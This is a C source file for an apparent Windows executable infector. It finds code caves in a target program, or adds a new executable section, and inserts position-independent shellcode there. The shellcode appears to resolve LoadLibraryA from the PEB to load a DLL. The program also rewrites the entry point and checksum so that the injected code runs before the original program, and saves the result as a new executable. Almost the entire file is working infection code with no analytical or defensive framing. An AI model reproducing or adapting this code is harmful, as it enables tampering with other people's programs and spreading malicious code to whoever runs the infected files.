#include <Windows.h>
#include <stdio.h>
#include <Imagehlp.h>
#include "PE Infect.h"

#define DEBUG


unsigned char ucShellCode[] = {0x83,0xEC,0x06,0xC7,0x04,0x24,0x74,0x2E,0x64,0x6C,0x66,0xC7,0x44,0x24,0x04,0x6C,0x00,0x64,0x8B,0x1D,0x30,0x00,0x00,0x00,0x8B,0x5B,0x0C,0x8B,0x5B,0x0C,0x8B,0x73,0x30,0x6A,0x18,0x59,0x31,0xFF,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x01,0xC7,0xE2,0xF3,0x8B,0x43,0x18,0x8B,0x1B,0x81,0xFF,0x30,0x03,0x00,0x00,0x75,0xDE,0x89,0xC3,0x31,0xD2,0x8B,0x73,0x3C,0x01,0xDE,0x8B,0x76,0x78,0x01,0xDE,0x8B,0x76,0x20,0x01,0xDE,0x8B,0x34,0x96,0x01,0xDE,0x31,0xFF,0x6A,0x0C,0x59,0x31,0xC0,0xAC,0xC1,0xCF,0x0D,0x01,0xC7,0xE2,0xF6,0x42,0x81,0xFF,0x8E,0x4E,0x0E,0xEC,0x75,0xD4,0x4A,0x8B,0x73,0x3C,0x01,0xDE,0x8B,0x76,0x78,0x01,0xDE,0x8B,0x4E,0x1C,0x8B,0x7E,0x24,0x01,0xDF,0x01,0xD9,0x66,0x8B,0x04,0x57,0x8B,0x0C,0x81,0x01,0xD9,0x54,0xFF,0xD1,0x83,0xC4,0x06,0xC3};
unsigned char ucCallCode[] = {0xE8,0x05,0x00,0x00,0x00};
unsigned char ucJMP[] = {0xE9, 0x00, 0x00, 0x00 ,0x00};


unsigned long CalculateBoundary(unsigned long Boundary, unsigned long Operand)
{
	return ((Operand + Boundary - 1)/Boundary) * Boundary;
}


unsigned long CreateFileBuffer(const char* szFileName, void** lpBase)
{
	HANDLE hFile = CreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, NULL);
	unsigned long ulBufferSize = 0;

	if (hFile != INVALID_HANDLE_VALUE)
	{

		if (ulBufferSize = GetFileSize(hFile, 0))
		{
			void* lpBuffer = VirtualAlloc(NULL,ulBufferSize,MEM_COMMIT|MEM_RESERVE,0x40);


			if (lpBuffer)
			{

				if (ReadFile(hFile,lpBuffer,ulBufferSize,&ulBufferSize,0))
				{
					*lpBase = lpBuffer;
				}
				else
				{
					VirtualFree(lpBuffer,ulBufferSize,MEM_RELEASE);
				}
			}
		}
		CloseHandle(hFile);
	}


	return ulBufferSize;
}

unsigned long WriteFileBuffer(const char* szFileName, void* lpBuffer, unsigned long ulBuffer)
{
	HANDLE hFile = CreateFileA(szFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, NULL);
	unsigned long ulWrittenBytes = 0;
	if (hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile,lpBuffer,ulBuffer,&ulWrittenBytes,0);
		CloseHandle(hFile);
	}
	return ulWrittenBytes;
}



__declspec(naked) void* m_memcpy (void* Dst, void* src, int len)
{


	__asm
	{
		push edi
			push esi
			mov ecx, dword ptr[esp+20]
		mov esi, dword ptr[esp+16]
		mov edi, dword ptr [esp+12]
		rep movsb
			pop esi
			pop edi
			ret

	}

}


unsigned long GetEOFSize(PIMAGE_SECTION_HEADER lpLastSection, unsigned long ulFileSize)
{
	return ulFileSize - (lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData);
}

void AddSection(void* lpModule, unsigned long ulModule, unsigned long ulRawSize)
{
	PIMAGE_DOS_HEADER lpDos = (PIMAGE_DOS_HEADER)(lpModule);
	PIMAGE_NT_HEADERS lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpDos + lpDos->e_lfanew);

	if (lpNt->Signature == IMAGE_NT_SIGNATURE)
	{
		unsigned long ulNewImageSize = ulModule + CalculateBoundary(lpNt->OptionalHeader.FileAlignment, ulRawSize);
		if (ulNewImageSize)
		{

			void * lpNewBase = VirtualAlloc(NULL,ulNewImageSize,MEM_COMMIT|MEM_RESERVE,0x40);

			if (lpNewBase)
			{
				PIMAGE_SECTION_HEADER lpLastSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpNewBase + lpDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ((lpNt->FileHeader.NumberOfSections-1)*40));
				PIMAGE_SECTION_HEADER lpNewSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpLastSection + sizeof(IMAGE_SECTION_HEADER));

				unsigned long ulEOF = 0;
				unsigned long ulCheckSum = 0;
				unsigned long ulOldCheckSum = 0;
				unsigned long ulEntryPoint = 0;
				unsigned long ulOffset = 0;


				lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpNewBase+ lpDos->e_lfanew);

				RtlSecureZeroMemory(lpNewBase,ulNewImageSize);

				m_memcpy(lpNewBase,lpModule,ulModule);
				m_memcpy(&lpNewSection->Name, ".stdio", strlen(".stdio"));


				lpNewSection->SizeOfRawData = CalculateBoundary(lpNt->OptionalHeader.FileAlignment,ulRawSize);
				lpNewSection->PointerToRawData = CalculateBoundary(lpNt->OptionalHeader.FileAlignment, lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData);
				lpNewSection->VirtualAddress = CalculateBoundary(lpNt->OptionalHeader.SectionAlignment, lpLastSection->VirtualAddress + lpLastSection->Misc.VirtualSize);
				lpNewSection->Characteristics = (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);
				lpNewSection->Misc.VirtualSize = ulRawSize;
				lpNt->FileHeader.NumberOfSections++;
				lpNt->OptionalHeader.SizeOfImage = CalculateBoundary(lpNt->OptionalHeader.SectionAlignment, lpNewSection->VirtualAddress + ulRawSize);




				ulEntryPoint = lpNt->OptionalHeader.AddressOfEntryPoint;


				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData), ucCallCode, sizeof(ucCallCode));
				ulOffset = ulEntryPoint - (lpNewSection->VirtualAddress + sizeof(ucCallCode)) - 5;
				m_memcpy(&ucJMP[1],&ulOffset, sizeof(unsigned long));
				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + sizeof(ucCallCode)), ucJMP,sizeof(ucJMP));
				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + sizeof(ucCallCode) + sizeof(ucJMP)), ucShellCode, sizeof(ucShellCode));

				if (ulEOF = GetEOFSize(lpLastSection, ulModule))
				{
					m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + lpNewSection->SizeOfRawData), (void*)((unsigned long)lpModule + (lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData)), ulEOF);
				}

				lpNt->OptionalHeader.AddressOfEntryPoint = (lpNewSection->VirtualAddress);

				if (CheckSumMappedFile(lpNewBase,ulNewImageSize, &ulOldCheckSum, &ulCheckSum))
				{

					lpNt->OptionalHeader.CheckSum = ulCheckSum;
				}



				if (WriteFileBuffer("NTTITON.exe",lpNewBase,ulNewImageSize))
				{
					printf("Had to add section.... no codecaves were available FUUUUCK\n");
				}



				VirtualFree(lpNewBase,ulNewImageSize,MEM_RELEASE);
			}
		}
	}
}


void ProcessCodeCave(unsigned long ulCounter, unsigned long ulSize, unsigned long ulStart, unsigned long ulInitial, void* lpBase, CodeCave* sCodeCave, unsigned long* pulCodeCave, PIMAGE_SECTION_HEADER lpSection, PIMAGE_NT_HEADERS lpNt)
{
	unsigned long ulEnd = ulCounter + ulInitial;

	if ((long)(ulEnd - (ulInitial+=2)) >= (long)ulSize)
	{

		lpSection->Characteristics = (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);
		sCodeCave->ulVirtualAddressOffset = ((ulStart + ulInitial) - (unsigned long)lpBase) - lpSection->PointerToRawData;
		sCodeCave->ulEntryPoint = lpNt->OptionalHeader.AddressOfEntryPoint;
		sCodeCave->ulVirtualAddress = lpSection->VirtualAddress;
		sCodeCave->ulAddressEntryPoint = (unsigned long)(&lpNt->OptionalHeader.AddressOfEntryPoint);
		*pulCodeCave = (ulStart + ulInitial);
		sCodeCave->ulAddress = *pulCodeCave;
		lpNt->OptionalHeader.AddressOfEntryPoint = sCodeCave->ulVirtualAddress + sCodeCave->ulVirtualAddressOffset;
	}

}

unsigned long ScanCodeCave(CodeCave* sCodeCave, void* lpBase, unsigned long ulBase, unsigned long ulSize)
{
	PIMAGE_DOS_HEADER lpDos = (PIMAGE_DOS_HEADER)(lpBase);
	PIMAGE_NT_HEADERS lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpDos + lpDos->e_lfanew);
	unsigned long ulCodeCave = 0;
	if (lpNt->Signature == IMAGE_NT_SIGNATURE)
	{
		PIMAGE_SECTION_HEADER lpSection = 0;
		unsigned short usSections = lpNt->FileHeader.NumberOfSections;
		unsigned short i = 0;
		for (i; i < usSections; i++)
		{
			unsigned long ulStart = 0;
			unsigned long a = 0;
			unsigned long ulCounter = 0;
			unsigned long ulInitial = 0;
			lpSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpNt + sizeof(IMAGE_NT_HEADERS) + (i*40));
			ulStart = lpSection->PointerToRawData + (unsigned long)lpBase;
			for (a; a < lpSection->SizeOfRawData; a++)
			{
				unsigned char ucByte = *(unsigned char*)(ulStart + a);

				if (ucByte == 0x00 || ucByte == 0x90)
				{
					if (!ulInitial)
					{
						ulInitial = a;
					}
					++ulCounter;
				}
				else
				{
					if (ulCounter > 0)
					{
						ProcessCodeCave(ulCounter, ulSize,  ulStart, ulInitial, lpBase, sCodeCave, &ulCodeCave, lpSection, lpNt);
						if (ulCodeCave)
							break;
						ulInitial = 0;
						ulCounter = 0;
						continue;
					}
				}
				if (a == (lpSection->SizeOfRawData - 1))
				{
					if (ulCounter > 0)
					{
						ProcessCodeCave(ulCounter, ulSize,  ulStart, ulInitial, lpBase, sCodeCave, &ulCodeCave, lpSection, lpNt);
						if (ulCodeCave)
							break;
					}
				}

			}
			if (ulCodeCave)
				break;
		}
	}
	return ulCodeCave;
}




unsigned long CalculateCodeCave(void* lpBase, unsigned long ulSize) //I don't use this, but i thought of this method as a mathematical approach to finding codecaves which are caused by alignments.
{

	PIMAGE_DOS_HEADER lpDos = (PIMAGE_DOS_HEADER)(lpBase);
	PIMAGE_NT_HEADERS lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpDos + lpDos->e_lfanew);
	unsigned long ulCodeCave = 0;

	if (lpNt->Signature == IMAGE_NT_SIGNATURE)
	{
		PIMAGE_SECTION_HEADER lpSection = 0;
		unsigned long ulSections = lpNt->FileHeader.NumberOfSections;
		unsigned long i = 0;
		unsigned long ulTemp = 0;

		for(i; i < ulSections; i ++)
		{
			lpSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpNt + sizeof(IMAGE_NT_HEADERS) + (i*40));
			ulTemp = lpSection->SizeOfRawData - lpSection->Misc.VirtualSize;
			if (ulTemp >= ulSize)
			{

				void* lpHeap = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ulTemp);
				if (lpHeap)
				{
					if (!memcmp((void*)((unsigned long)lpBase + lpSection->PointerToRawData + lpSection->Misc.VirtualSize), lpHeap, ulTemp))
					{
						ulCodeCave = (unsigned long)lpBase + lpSection->PointerToRawData + lpSection->Misc.VirtualSize;
						HeapFree(GetProcessHeap(),0,lpHeap);
						break;
					}

					HeapFree(GetProcessHeap(),0,lpHeap);
				}
			}
		}
	}
	return ulCodeCave;
}


int main(int argc, char* argv[])
{
	void* lpBuffer = 0;
	unsigned long ulBuffer = CreateFileBuffer(argv[1], &lpBuffer);

	if (lpBuffer)
	{
		if (ulBuffer)
		{
			unsigned long ulCodeCave = 0;
			CodeCave sCodeCave = {0};


			if (ulCodeCave = ScanCodeCave(&sCodeCave, lpBuffer,ulBuffer,sizeof(ucShellCode)+10))
			{
				unsigned long ulOffset = 0;

				m_memcpy((void*)(sCodeCave.ulAddress), ucCallCode, sizeof(ucCallCode));
				ulOffset = sCodeCave.ulEntryPoint - (sCodeCave.ulVirtualAddress + sCodeCave.ulVirtualAddressOffset + sizeof(ucCallCode)) - 5;
				m_memcpy(&ucJMP[1],&ulOffset, sizeof(unsigned long));
				m_memcpy((void*)(sCodeCave.ulAddress + sizeof(ucCallCode)), ucJMP,sizeof(ucJMP));
				m_memcpy((void*)(sCodeCave.ulAddress + sizeof(ucCallCode) + sizeof(ucJMP)), ucShellCode, sizeof(ucShellCode));


				if (WriteFileBuffer("NTTITON.exe", lpBuffer,ulBuffer) == ulBuffer)
				{
					printf("Done\n");
				}

			}
			else
			{
				AddSection(lpBuffer,ulBuffer, sizeof(ucShellCode) + 10);
			}
		}
		VirtualFree(lpBuffer,ulBuffer,MEM_RELEASE);
	}
	return 0;
}
